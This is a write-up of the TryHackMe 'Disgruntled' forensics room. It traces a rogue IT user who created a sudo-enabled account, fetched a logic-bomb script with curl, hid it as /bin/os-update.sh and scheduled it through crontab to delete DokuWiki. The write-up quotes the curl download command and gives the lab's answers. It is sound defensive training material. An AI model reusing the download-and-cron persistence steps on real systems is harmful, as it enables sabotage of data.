# [TryHackMe - Disgruntled](https://tryhackme.com/room/disgruntled)
![17bf632054e2a09eb9bca1918230589d.png](/resources/17bf632054e2a09eb9bca1918230589d.png)
***
[toc]
***
## Introduction
**Hey, kid! Good, you’re here!**

**Not sure if you’ve seen the news, but an employee from the IT department of one of our clients (CyberT) got arrested by the police. The guy was running a successful phishing operation as a side gig.**

**CyberT wants us to check if this person has done anything malicious to any of their assets. Get set up, grab a cup of coffee, and meet me in the conference room.**

![bcfe2405d78c8e84ae8a4409e2046897.png](/resources/bcfe2405d78c8e84ae8a4409e2046897.png)

After deployed the machine, we automatically accessed the compromised machine as root so we have to conduct an investigation with cares since root privilege can tampered with live evidence and we have to redeploy to machine it if we accidently deleted critical evidences

* * *
## Nothing suspicious... So far
**Here’s the machine our disgruntled IT user last worked on. Check if there’s anything our client needs to be worried about.**

**My advice: Look at the privileged commands that were run. That should get you started.**

>The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?

If we're looking for privileged commands, the best places to check are `bash_history` of root user and `auth.log`, which keeps track of authentication events and also commands executed by user using `sudo` as well.

![165a61600129eb8cf564494246c2350a.png](/resources/165a61600129eb8cf564494246c2350a.png)

To filter out commands from auth.log, we can run `grep COMMAND /var/log/auth.log`. This helps us see what was run with elevated privileges. Looking at the logs, it turns out the "cybert" user installed **DokuWiki** using `apt` with `sudo`.

```
/usr/bin/apt install dokuwiki
```

>What was the present working directory (PWD) when the previous command was run?

![2533faf610bc1b86492d48d458158ae3.png](/resources/2533faf610bc1b86492d48d458158ae3.png)

We can see that most commands are executed from home directory of "cybert" user including the previous command we found as well.

```
/home/cybert
```

***
## Let’s see if you did anything bad
**Keep going. Our disgruntled IT was supposed to only install a service on this computer, so look for commands that are unrelated to that.**

>Which user was created after the package from the previous task was installed?

![784ff15d7a1460a2fe90be27bbff919e.png](/resources/784ff15d7a1460a2fe90be27bbff919e.png)

After installed DokuWiki, user then created another user "it-admin" with `sudo`

```
it-admin
```

>A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)

![374681854fe24f5e02fe8cda5c61602a.png](/resources/374681854fe24f5e02fe8cda5c61602a.png)

Notice that `visudo` was used and then "it-admin" was found to executed command as root via `sudo` which mean user edited `/etc/sudoers` file to make "it-admin" user can execute command as root.

![1dcfee70068c19ae705f1cdecbe54990.png](/resources/1dcfee70068c19ae705f1cdecbe54990.png)

To match the timeline from the audit log, we can use `stat /etc/sudoers` to display statistic of a file which included Access, Modify and Change timestamp as well and as we can see from the above image, the modify and change timestamp matches the timestamp of `visudo` binary usage in audit log.

```
Dec 28 06:27:34
```

>A script file was opened using the "vi" text editor. What is the name of this file?

![ce7f4352d887a68046d805014b4e3718.png](/resources/ce7f4352d887a68046d805014b4e3718.png)

Then after that, we can see that "it-admin" user used `vi` to edit `bomb.sh` file.

```
bomb.sh
```
* * *
## Bomb has been planted. But when and where?
**That `bomb.sh` file is a huge red flag! While a file is already incriminating in itself, we still need to find out where it came from and what it contains. The problem is that the file does not exist anymore.**

>What is the command used that created the file `bomb.sh`?

![ac6c2787b16650d9e7ee4997241b2d33.png](/resources/ac6c2787b16650d9e7ee4997241b2d33.png)

Upon accessing "it-admin" user's home directory, `bomb.sh` was nowhere to be found so we have to inspect `.bash_history` to find out what happened and it turns out, the file was not newly created on this machine but fetched from other server using `curl` but we could also see that "it-admin" removed `bomb.sh` later which is the reason why we could not find this file on this user's home directory

```
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
```

>The file was renamed and moved to a different directory. What is the full path of this file now?

![4d52d81b8183beffcebf791b77ef1079.png](/resources/4d52d81b8183beffcebf791b77ef1079.png)

Since we know that user use `vi` to edit file then we can inspect `.viminfo` file for any history related to `vi` and we can see that the file was saved as `/bin/os-update.sh`. 

```
/bin/os-update.sh
```

>When was the file from the previous question last modified? (Format: Month Day HH:MM)

![26975dd3ecb73bdadb7176e0c3bbb1d7.png](/resources/26975dd3ecb73bdadb7176e0c3bbb1d7.png)

We could copy UNIX timestamp from `.viminfo` and convert it but lets just use `stat /bin/os-update.sh` since its a lot easier which we can see that upon saving this file, there is no modification on this file after that.

```
Dec 28 06:29
```

>What is the name of the file that will get created when the file from the first question executes?

![fe845f14134c336b683768d9f7c7e7ca.png](/resources/fe845f14134c336b683768d9f7c7e7ca.png)

Lets see what's inside this file, and It appears to be a logic bomb to remove dokuwiki installation directory if "it-admin" user hasn't logged in in the last 90 days and will also create a file with taunting message after the deletion.

```
goodbye.txt
```
* * *
## Following the fuse
**So we have a file and a motive. The question we now have is: how will this file be executed?**

**Surely, he wants it to execute at some point?**

>At what time will the malicious file trigger? (Format: HH:MM AM/PM)

![e1761a6c71c0ca4c1ba3d1b43937c999.png](/resources/e1761a6c71c0ca4c1ba3d1b43937c999.png)

From bash history file, we found that user also use nano to edit `/etc/crontab` file which responsible for global cronjob of the system.

![d90c8c91f5a6d762c24345a2f4386816.png](/resources/d90c8c91f5a6d762c24345a2f4386816.png)

By inspecting the file, we can see that the logic bomb script is set to  execute at 08:00 AM everyday.

```
08:00 AM
```

![8224f9be9ee9d6849e876d2dcaecbcc6.png](/resources/8224f9be9ee9d6849e876d2dcaecbcc6.png)

And we are done.

![95bdfe7c4391d8ba2e289081f79950b8.png](/resources/95bdfe7c4391d8ba2e289081f79950b8.png)
https://tryhackme.com/chicken0248/badges/handle-the-disgruntled

***